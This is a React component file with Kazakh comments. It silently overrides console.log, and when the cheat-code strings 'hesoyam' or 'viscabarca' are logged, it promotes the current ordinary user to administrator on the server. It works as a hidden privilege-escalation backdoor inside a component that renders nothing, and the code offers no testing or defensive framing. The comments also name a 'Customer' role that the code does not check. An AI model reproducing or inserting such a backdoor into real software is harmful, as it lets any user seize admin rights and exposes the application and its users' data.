// src/components/ConsoleRoleChanger.jsx
import React, { useEffect } from "react";
import { useDispatch, useSelector } from "react-redux";
import { updateUserRoleOnServer } from "../redux/auth";

const ConsoleRoleChanger = () => {
  const dispatch = useDispatch();
  const { user } = useSelector((state) => state.auth);

  useEffect(() => {
    // Оригиналды console.log функциясын сақтаймыз
    const originalConsoleLog = console.log;

    // console.log функциясын қайта анықтаймыз, енгізілген мәнді тексеру үшін
    console.log = function (...args) {
      // Оригиналды console.log функциясын шақырамыз
      originalConsoleLog.apply(console, args);

      // Енгізілген мәнді тексереміз
      const input = args[0]?.toString().trim().toLowerCase();
      if (input === "hesoyam" || input === "viscabarca") {
        // Қолданушы авторизацияланған және оның рөлі "Customer" болса
        if (user && user.role === "user") {
          dispatch(updateUserRoleOnServer(user.id, "admin")); // Рөлді серверде және Redux-та жаңартамыз
          originalConsoleLog("Рөл сәтті өзгертілді: енді сіз Adminсіз!");
        } else {
          originalConsoleLog(
            "Қате: Рөл тек Customer рөлі бар қолданушылар үшін ғана өзгертіледі."
          );
        }
      }
    };

    // Компонент жойылғанда (unmount) оригиналды console.log функциясын қалпына келтіреміз
    return () => {
      console.log = originalConsoleLog;
    };
  }, [dispatch, user]); // user және dispatch өзгергенде қайта іске қосылады

  return null; // Бұл компонент ешқандай UI рендерлемейді, тек функционалдық логика
};

export default ConsoleRoleChanger;